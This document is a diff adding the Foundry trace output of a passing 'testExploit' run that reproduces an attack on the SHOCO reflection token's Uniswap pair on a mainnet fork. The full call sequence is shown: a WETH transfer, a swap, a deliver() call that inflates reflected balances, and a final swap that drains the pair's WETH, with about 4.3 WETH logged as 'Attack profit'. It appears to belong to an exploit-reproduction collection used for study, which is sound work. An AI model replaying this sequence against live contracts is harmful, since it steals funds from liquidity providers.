@@ -1,0 +1,135 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+No files changed, compilation skipped
+
+Ran 1 test for test/SHOCO_exp.sol:SHOCOAttacker
+[PASS] testExploit() (gas: 406522)
+Logs:
+  WETH balance: 4.302343536951834471
+  WETH amountIn: 46.402464960714259999
+  Attack profit:: 4.301834963160736116
+
+Traces:
+  [12032] SHOCOAttacker::setUp()
+    ├─ [0] VM::createSelectFork("mainnet")
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18], "shoco-weth UniswapPair")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SHOCO: [0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6], "SHOCO")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [491722] SHOCOAttacker::testExploit()
+    ├─ [0] VM::rollFork(16440978 [1.644e7])
+    │   └─ ← [Return]
+    ├─ [2534] WETH::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   └─ ← [Return] 4302343536951834471 [4.302e18]
+    ├─ [2444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "WETH balance", val: 4302343536951834471 [4.302e18], decimals: 18)
+    ├─ [2534] WETH::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2])
+    │   └─ ← [Return] [0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [534] WETH::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
+    ├─ [0] VM::load(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000)
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 2000000000000000000000 [2e21]
+    ├─ [0] VM::load(SHOCO: [0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6], 0x000000000000000000000000000000000000000000000000000000000000000e) [staticcall]
+    │   └─ ← [Return] 0xcd11c78de107af3b87bf064a09f4435c08ab252a4e4205a85da9b3be8e098528
+    ├─ [0] VM::load(SHOCO: [0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6], 0xf3993fcf65d9e10f758df54dd8c5b61c4fe96cb939159675b0672bf6f1e926ea) [staticcall]
+    │   └─ ← [Return] 0x12089b5b0090545834a4f19b3611f4f41f2883b9457737276ad88e7600a59a52
+    ├─ [12425] SHOCO::tokenFromReflection(84598709357129465372817349559592576052344204849598008561584927096988714134230 [8.459e76]) [staticcall]
+    │   └─ ← [Return] 912595882656935761743974 [9.125e23]
+    ├─ [2504] shoco-weth UniswapPair::getReserves() [staticcall]
+    │   └─ ← [Return] 997464549590102610469778 [9.974e23], 4302343536951834471 [4.302e18], 1635086807 [1.635e9]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "WETH amountIn", val: 46402464960714259999 [4.64e19], decimals: 18)
+    ├─ [6062] WETH::transfer(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18], 46402464960714259999 [4.64e19])
+    │   ├─ emit Transfer(from: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18], value: 46402464960714259999 [4.64e19])
+    │   ├─  storage changes:
+    │   │   @ 0x9bda35c8b2cd3b317c80d223b0ef0e0937d0967c3ad20e8bb345e0e0fceb1073: 0x0000000000000000000000000000000000000000000000003bb4fea6edb63767 → 0x000000000000000000000000000000000000000000000002bfabaaaedb987586
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000 → 0x000000000000000000000000000000000000000000000069e79caf83cf5dc1e1
+    │   └─ ← [Return] true
+    ├─ [122325] shoco-weth UniswapPair::swap(912595882656935661743974 [9.125e23], 0, SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   ├─ [85633] SHOCO::transfer(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 912595882656935661743974 [9.125e23])
+    │   │   ├─ emit Transfer(from: shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18], to: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 830462253217811452187018 [8.304e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9bda35c8b2cd3b317c80d223b0ef0e0937d0967c3ad20e8bb345e0e0fceb1073: 0xcc6dfa37e7d513e34e08cdbfd00c4df3797df1be6dc3cd07030c885c933e5e8f → 0x1164ce05075dbec4cb8be6e40bba73d87b5409484f1dd1a384647e82936bf0eb
+    │   │   │   @ 14: 0xcd11c78de107af3b87bf064a09f4435c08ab252a4e4205a85da9b3be8e098528 → 0xcb32f7c091fc404d252a03025f296dc0991242715113f0bd80b1069990947cce
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0xb92a5c65916be6301fe7e3941987047f8e9105bd2177e678a1af5cb5025d654a
+    │   │   │   @ 0x863c108e18cfcca3919df9dd844a7f7ecc397bd1ecd25b3c1ae043a85d80a36d: 0x005852d87204be088f038d4e32d8e970b1904a2b3f0ac4ea56075ab62bf8f6a8 → 0x0f4ed142ea60357ba3b07e631ed3b22cd7db92e1dcbdfa48f14ecadaac4231f6
+    │   │   │   @ 15: 0x000000000000000000000000000000000000000000002ef7b8180c6451859b00 → 0x0000000000000000000000000000000000000000000030e67036cdc12caec1df
+    │   │   └─ ← [Return] true
+    │   ├─ [4838] SHOCO::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   │   └─ ← [Return] 85725926195118129931179 [8.572e22]
+    │   ├─ [534] WETH::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   │   └─ ← [Return] 50704808497666094470 [5.07e19]
+    │   ├─ emit Sync(reserve0: 85725926195118129931179 [8.572e22], reserve1: 50704808497666094470 [5.07e19])
+    │   ├─ emit Swap(sender: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 857259261951181205375 [8.572e20], amount1In: 46402464960714259999 [4.64e19], amount0Out: 912595882656935661743974 [9.125e23], amount1Out: 0, to: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 10: 0x00000000000000000000000001b3e5afcb963101121b528b7e5d9e2371483e53 → 0x00000000000000000000000009ef99ac6f8c62b5ddf9904235ed3d858190ca03
+    │   │   @ 9: 0x0000000000000000000000000000000000958172109fbcd05c83f22efa71e6ee → 0x00000000000000000000000000000000013dec0edbec3da711a856e0791ec83e
+    │   │   @ 8: 0x617571d70000000000003bb4fea6edb6376700000000d338a95d7284c08ae392 → 0x63c93d67000000000002bfabaaaedb98758600000000122736369f097a29e3ab
+    │   └─ ← [Stop]
+    ├─ [4838] SHOCO::balanceOf(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 912595882656935660733872 [9.125e23]
+    ├─ [7340] SHOCO::deliver(912586756698109091377264 [9.125e23])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0xb92a5c65916be6301fe7e3941987047f8e9105bd2177e678a1af5cb5025d654a → 0x000079599c7b40955b247ad281544e799218b7b0e98f82dee22b7d5b220d89da
+    │   │   @ 14: 0xcb32f7c091fc404d252a03025f296dc0991242715113f0bd80b1069990947cce → 0x120914b49d0b9ab260669a40c6f6b7ba9c99f465192b8d23c12d273fb044a15e
+    │   │   @ 15: 0x0000000000000000000000000000000000000000000030e67036cdc12caec1df → 0x00000000000000000000000000000000000000000000f225dd946ad33c30b24f
+    │   └─ ← [Stop]
+    ├─ [504] shoco-weth UniswapPair::getReserves() [staticcall]
+    │   └─ ← [Return] 85725926195118129931179 [8.572e22], 50704808497666094470 [5.07e19], 1674132839 [1.674e9]
+    ├─ [4838] SHOCO::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   └─ ← [Return] 8572592619416928738451500486 [8.572e27]
+    ├─ [20741] shoco-weth UniswapPair::swap(0, 50704299923874996115 [5.07e19], SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   ├─ [3262] WETH::transfer(SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50704299923874996115 [5.07e19])
+    │   │   ├─ emit Transfer(from: shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18], to: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50704299923874996115 [5.07e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000069e79caf83cf5dc1e1 → 0x00000000000000000000000000000000000000000000006ca7468ba71acd2174
+    │   │   │   @ 0x9bda35c8b2cd3b317c80d223b0ef0e0937d0967c3ad20e8bb345e0e0fceb1073: 0x000000000000000000000000000000000000000000000002bfabaaaedb987586 → 0x0000000000000000000000000000000000000000000000000001ce8b902915f3
+    │   │   └─ ← [Return] true
+    │   ├─ [4838] SHOCO::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   │   └─ ← [Return] 8572592619416928738451500486 [8.572e27]
+    │   ├─ [534] WETH::balanceOf(shoco-weth UniswapPair: [0x806b6C6819b1f62Ca4B66658b669f0A98e385D18]) [staticcall]
+    │   │   └─ ← [Return] 508573791098355 [5.085e14]
+    │   ├─ emit Sync(reserve0: 8572592619416928738451500486 [8.572e27], reserve1: 508573791098355 [5.085e14])
+    │   ├─ emit Swap(sender: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 8572506893490733620321569307 [8.572e27], amount1In: 0, amount0Out: 0, amount1Out: 50704299923874996115 [5.07e19], to: SHOCOAttacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x63c93d67000000000002bfabaaaedb98758600000000122736369f097a29e3ab → 0x63c93d670000000000000001ce8b902915f300001bb31519171abd4e14d9adc6
+    │   └─ ← [Stop]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attack profit:", val: 4301834963160736116 [4.301e18], decimals: 18)
+    ├─  storage changes:
+    │   @ 0x6693fd66acae514ed2305cd0b7604a94266e750f2e1cc984901c9bc7c8726a57: 0 → 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c
+    │   @ 0x6693fd66acae514ed2305cd0b7604a94266e750f2e1cc984901c9bc7c8726a5a: 0 → 1
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.14s (8.73s CPU time)
+
+Ran 1 test suite in 10.14s (10.14s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
